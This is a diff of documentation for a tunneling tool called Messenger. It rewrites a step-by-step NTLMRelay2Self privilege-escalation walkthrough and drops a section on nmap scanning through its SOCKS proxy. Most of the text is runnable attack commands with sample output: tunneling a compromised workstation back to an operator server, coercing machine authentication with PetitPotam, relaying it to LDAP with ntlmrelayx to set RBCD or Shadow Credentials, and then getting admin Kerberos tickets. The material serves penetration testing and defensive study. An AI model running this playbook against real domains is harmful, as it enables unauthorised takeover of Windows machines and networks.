@@ -1,179 +1,143 @@
+# NTLMRelay2Self with Messenger
 
-### NTLMRelay2Self
+[NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) is a privilege escalation attack where authentication is coerced from a machine account and relayed to LDAP to gain SYSTEM-level access. Messenger's remote port forwards and SOCKS proxy make this possible without dropping additional tools on the target.
 
-[NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) is a type of privilege escalation attack where an attacker performs authentication coercion and LDAP relay attacks in order to gain SYSTEM-level access to the compromised system. This attack requires the following:
+## Prerequisites
+
 - Low-privileged access on a domain-joined Windows workstation
-- Ability to trigger-start the WebClient service on the workstation
-- Ability to coerce authentication (via EFS, spooler, etc.) on the workstation
+- Ability to trigger-start the WebClient service
+- Ability to coerce authentication (EFS, spooler, etc.)
 - LDAP signing or LDAPS channel binding not enforced on a DC
-- Ability to perform computer-takeover primitive (RBCD or Shadow Credentials)
+- Ability to perform a computer-takeover primitive (RBCD or Shadow Credentials)
 
-1. Start a Messenger client up with a reverse port forward for a high port. In this example, we will be using TCP/8888, however, any other high port not already in use should work. Since this is NTLMRelay2**self**, we only need to bind the reverse port forward to 127.0.0.1 on the Messenger client side.
+## Attack Flow
+
 ```
-> python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 127.0.0.1:8888:127.0.0.1:8888
++------------------------------+       +------------------------------+       +-----------------------+
+|      Operator Machine        |       |     Victim Workstation       |       |   Domain Controller   |
+|                              |       |                              |       |                       |
+|  Messenger Server            |       |  Messenger Client            |       |                       |
+|  ntlmrelayx on :8888         |       |  rportfwd 127.0.0.1:8888    |       |   LDAP on :389        |
+|  SOCKS proxy on :1080        |       |                              |       |                       |
++------------------------------+       +------------------------------+       +-----------------------+
+        |                                       |                                     |
+        |  1. rportfwd bridges :8888            |                                     |
+        |<--------------------------------------|                                     |
+        |  2. Coerce auth via PetitPotam        |                                     |
+        |  (through SOCKS)                      |                                     |
+        |-------------------------------------->|                                     |
+        |  3. WebDAV auth sent to               |                                     |
+        |     localhost:8888 (self)              |                                     |
+        |<--------------------------------------|                                     |
+        |  4. ntlmrelayx relays to DC           |                                     |
+        |  (through SOCKS)                      |                                     |
+        |-------------------------------------------------------------------->        |
+        |  5. RBCD / Shadow Creds set           |                                     |
+        |<--------------------------------------------------------------------|       |
 ```
-2. Start up a SOCKS proxy on the Messenger server for the new Messenger client that checked in:
+
+## Steps
+
+### 1. Connect the messenger client
+
+Connect a client from the compromised workstation to the server:
+
+```
+> client.exe --server-url 192.168.1.100:8080 --encryption-key MyKey
+[+] Connected to ws://192.168.1.100:8080/
+```
+
+### 2. Set up SOCKS proxy and remote port forward
+
 ```
 [+] WebSocket Messenger `PWnauryxxD` is now connected.
 (messenger)~# PWnauryxxD
 (PWnauryxxD)~# socks 1080
-[*] Attempting to forward (127.0.0.1:1080) -> (*:*).
-[+] Messenger PWnauryxxD now forwarding (127.0.0.1:1080) -> (*:*).
-(PWnauryxxD)~#
-```
-3. Test to make sure LDAP signing or LDAPS channel binding is disabled on a Domain Controller. NetExec ldap-checker module or [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) can be used.
-```
-$ proxychains netexec ldap dc.borgar.local -u lowbie -p P@ssw0rd -M ldap-checker
-[proxychains] config file found: /etc/proxychains.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.14
-[proxychains] DLL init: proxychains-ng 4.14
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
-LDAP        224.0.0.1       389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:borgar.local)
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
-LDAP        224.0.0.1       389    DC               [+] borgar.local\lowbie:P@ssw0rd 
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
-LDAP-CHE... 224.0.0.1       389    DC               LDAP signing NOT enforced
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:636  ...  OK
-LDAP-CHE... 224.0.0.1       389    DC               LDAPS channel binding is set to: Never
+[*] Messenger `PWnauryxxD` is attempting to start SOCKS Server (127.0.0.1:1080 -> *:*).
+[+] Messenger `PWnauryxxD` started SOCKS Server (127.0.0.1:1080 -> *:*).
+(PWnauryxxD)~# remote 127.0.0.1:8888:127.0.0.1:8888
+[*] Queued Remote Port Forwarder request for Messenger `PWnauryxxD` for (127.0.0.1:8888) -> (127.0.0.1:8888).
+[+] Messenger `PWnauryxxD` is now remote forwarding (127.0.0.1:8888) -> (127.0.0.1:8888).
 ```
 
-4. Set up the reverse port forward: 127.0.0.1:8888 on the Messenger client host -> 127.0.0.1:8888 on the Messenger server
+The remote forward binds to `127.0.0.1:8888` on the client (only loopback -- this is relay2**self**) and forwards connections back to `127.0.0.1:8888` on the server where ntlmrelayx will be listening.
+
+### 3. Verify LDAP signing is not enforced
+
 ```
-(PWnauryxxD)~# remote 127.0.0.1:8888
-[*] Messenger PWnauryxxD now forwarding (*:*) -> (127.0.0.1:8888).
+$ proxychains netexec ldap dc.borgar.local -u lowbie -p 'P@ssw0rd' -M ldap-checker
+LDAP-CHE... dc.borgar.local  LDAP signing NOT enforced
+LDAP-CHE... dc.borgar.local  LDAPS channel binding is set to: Never
 ```
-5. Check the status of the WebClient service. By default it will be installed on Windows workstations, but not started.
+
+### 4. Start the WebClient service
+
+The WebClient service must be running for WebDAV-based coercion. It has a Manual (Trigger) startup type on workstations, so a low-privilege user can trigger-start it:
+
 ```powershell
-Get-Service -ServiceName WebClient
-
-Status   Name               DisplayName
-------   ----               -----------
-Stopped  WebClient          WebClient
-```
-6. By default, the WebClient service has a Startup Type of Manual (Trigger), which means with the right actions, a low-privilege user can start the service. We can either upload a [.searchConnector-ms file](https://gitlab.com/KevinJClark/ops-scripts/-/tree/main/start_webclient_searchConnector-ms) and view it in an explorer window, or use a [C# script](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797) or a [Beacon Object File](https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c) to start it.
-```
+# Using a .searchConnector-ms file, a C# trigger, or a BOF:
 > StartWebClient.exe
 [+] WebClient Service started successfully
 ```
+
+Verify:
 ```powershell
-get-service -ServiceName WebClient
-
-Status   Name               DisplayName
-------   ----               -----------
-Running  WebClient          WebClient
-```
-7. Start an NTLM HTTP capture/relay server on TCP/8888 on the Messenger server host. Set it up for either Shadow Credentials or RBCD relay. Relay to LDAP or LDAPS on a DC without signing/channel binding required. Set it up to use the SOCKS proxy for outgoing traffic.
-
-RBCD Method:
-```
-# proxychains ntlmrelayx.py -t ldap://dc.borgar.local --no-smb-server --http-port 8888 --no-acl --no-dump --no-da --no-validate-privs --delegate-access
+Get-Service -ServiceName WebClient
+# Status: Running
 ```
 
-Shadow Credentials Method:
-```
-# proxychains ntlmrelayx.py -t ldap://dc.borgar.local --no-smb-server --http-port 8888 --no-acl --no-dump --no-da --no-validate-privs --shadow-credentials --pfx-pass ''
-```
-8. Perform authentication coercion using [Printerbug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), [PetitPotam](https://github.com/topotam/PetitPotam), or [Coercer](https://github.com/p0dalirius/Coercer). Specify a "dotless hostname" (a hostname without dots and not an IP address) for the capture server, with `@<port>/something` afterwards. The dotless hostname can either be the computer's NetBIOS name or just the word `localhost`. This command should also go through the SOCKS proxy.
-```
-$ proxychains python3 PetitPotam.py -u lowbie -p P@ssw0rd -d borgar.local localhost@8888/something 127.0.0.1
-[proxychains] config file found: /etc/proxychains.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.14
+### 5. Start ntlmrelayx
 
-                                                                                               
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+Start ntlmrelayx on port 8888 (where the remote forward delivers traffic), relaying to LDAP through the SOCKS proxy:
 
-
-
-Trying pipe lsarpc
-[-] Connecting to ncacn_np:127.0.0.1[\PIPE\lsarpc]
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
-[+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
+**RBCD method:**
 ```
-9. If everything worked correctly, `ntlmrelayx.py` should have caught WebDAV (HTTP) authentication from the coerced authentication attack. In `ntlmrelayx.py`, output indicating successful modification of RBCD permissions or Shadow Credentials should display.
-
-RBCD Method:
+$ proxychains ntlmrelayx.py -t ldap://dc.borgar.local \
+    --no-smb-server --http-port 8888 \
+    --no-acl --no-dump --no-da --no-validate-privs \
+    --delegate-access
 ```
-[*] Servers started, waiting for connections
-[*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldap://dc.borgar.local
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
+
+**Shadow Credentials method:**
+```
+$ proxychains ntlmrelayx.py -t ldap://dc.borgar.local \
+    --no-smb-server --http-port 8888 \
+    --no-acl --no-dump --no-da --no-validate-privs \
+    --shadow-credentials --pfx-pass ''
+```
+
+### 6. Coerce authentication
+
+Use PetitPotam (or PrinterBug, Coercer, etc.) through the SOCKS proxy. The capture address must be a **dotless hostname** (not an IP) with `@port/path` so Windows uses WebDAV:
+
+```
+$ proxychains python3 PetitPotam.py \
+    -u lowbie -p 'P@ssw0rd' -d borgar.local \
+    localhost@8888/something 127.0.0.1
+```
+
+### 7. Verify relay success
+
+**RBCD:**
+```
 [*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
-[*] Assuming relayed user has privileges to escalate a user via ACL attack
-[*] Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
 [*] Attempting to create computer in: CN=Computers,DC=borgar,DC=local
 [*] Adding new computer with username: NUUQERGH$ and password: MWw4SBXWXr(hc*n result: OK
 [*] Delegation rights modified succesfully!
 [*] NUUQERGH$ can now impersonate users on WS01$ via S4U2Proxy
 ```
-Shadow Credentials Method:
+
+**Shadow Credentials:**
 ```
-[*] Servers started, waiting for connections
-[*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldap://dc.borgar.local
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc.borgar.local:389  ...  OK
 [*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
-[*] Assuming relayed user has privileges to escalate a user via ACL attack
-[*] Searching for the target account
-[*] Target user found: CN=WS01,CN=Computers,DC=borgar,DC=local
-[*] Generating certificate
-[*] HTTPD(8888): Connection from 127.0.0.1 controlled, but there are no more targets left!
-[*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: 3e698916-c5d1-0022-ced9-241b5e4c557e
-[*] Updating the msDS-KeyCredentialLink attribute of WS01$
 [*] Updated the msDS-KeyCredentialLink attribute of the target object
 [*] Saved PFX (#PKCS12) certificate & key at path: AdK8BkC5.pfx
-[*] Must be used with password: 
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 [*] Run the following command to obtain a TGT
 [*] python3 PKINITtools/gettgtpkinit.py -cert-pfx AdK8BkC5.pfx -pfx-pass  borgar.local/WS01$ AdK8BkC5.ccache
 ```
-10. After this, an administrative Kerberos TGT can be generated for the victim workstation via `getST.py` for [the RBCD method](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html), or `certipy`+`ticketer.py` for [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials).
 
-Below is a visual diagram of what the whole attack flow looks like:
-```
-+------------------------------+        +------------------------------+        +------------------------------+
-|    Attacker Machine          |        |      Victim Workstation      |        |     Domain Controller        |
-|                              |        |                              |        |                              |
-|  +------------------------+  |        |  +------------------------+  |        |  +------------------------+  |
-|  |  Messenger Server      |<============>|    Messenger Client    |<============>|      LDAP Server       |  |
-|  |  and NTLMRelayX        |  |        |  +------------------------+  |        |  +------------------------+  |
-|  +------------------------+  |        | 1. Coerce auth via PetitPotam|        |  5. LDAP relay successful    |
-| 4. Relay NTLM WebDAV (HTTP)  |        | 2. Send WebDAV auth to self  |        |  6. Set up RBCD or Shadow    |
-|    auth to Domain Controller |        | 3. Redirect WebDAV auth to   |        |     Credentials              |
-|    over SOCKS proxy          |        |    attacker via rportfwd     |        |                              |
-+------------------------------+        +------------------------------+        +------------------------------+
+### 8. Obtain admin access
 
-```
-
-### Port Scanning
-
-Messenger is robust enough to handle port scans through the SOCKS proxy. Generally, port scans take longer through the context of a SOCKS proxy, and should be limited to small groups of hosts and ports. Using `nmap`, a group of hosts or range can be scanned. A few caveats apply:
-- Use the `-sT` flag in `nmap`, since the SOCKS proxy is unable to open raw sockets (which the default scan method requires in `nmap`). This feature turns off SYN scanning, and uses full TCP connect scans, which the SOCKS proxy can handle.
-- Use the `-Pn` flag to avoid scanning additional ports for live host discovery. Perform live host discovery manually. Reduce the number of ports you are scanning!
-- Adjustments for the default connect timeouts can be reduced. Note that these timeout values may need to be increased on higher-latency networks. I recommend the following adjustments for a proxychains-ng `/etc/proxychains.conf` file:
-```
-dynamic_chain
-proxy_dns 
-tcp_connect_time_out 3000
-tcp_read_time_out 5000
-```
-A final Nmap command might look like the following:
-```
-$ proxychains nmap -sT -Pn -p445 192.168.1.0/24
-```
+From here, generate an administrative Kerberos TGT for the victim workstation:
+- **RBCD**: Use `getST.py` to request a service ticket impersonating an admin via S4U2Proxy
+- **Shadow Credentials**: Use `gettgtpkinit.py` + `getnthash.py` from PKINITtools, then `ticketer.py` or pass-the-hash
